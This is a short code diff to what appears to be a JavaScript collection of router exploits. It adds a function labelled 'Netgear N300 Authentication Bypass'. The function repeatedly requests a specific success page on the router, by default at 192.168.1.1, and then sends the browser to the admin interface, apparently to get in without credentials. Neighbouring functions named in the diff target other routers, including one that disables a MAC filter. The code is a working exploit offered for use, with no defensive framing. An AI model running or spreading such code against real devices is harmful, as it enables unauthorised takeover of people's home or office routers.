@@ -538,6 +538,16 @@ function wndr3400_disclosure(ip)
 	document.location="http://"+ip+url;
 }
 
+// Netgear N300 Authentication Bypass
+function n300d_bypassauth(ip)
+{
+	ip = ip || "192.168.1.1";
+	for (i = 0; i <= 3; i++){
+		$.get("http://" + ip + "/BRS_netgear_success.html");
+	}
+	document.location="http://"+ip;
+}
+
 // D-Link DSL-2740B - Disable Wireless MAC Filter
 function dsl2740b_disablemacfilter(ip)
 {
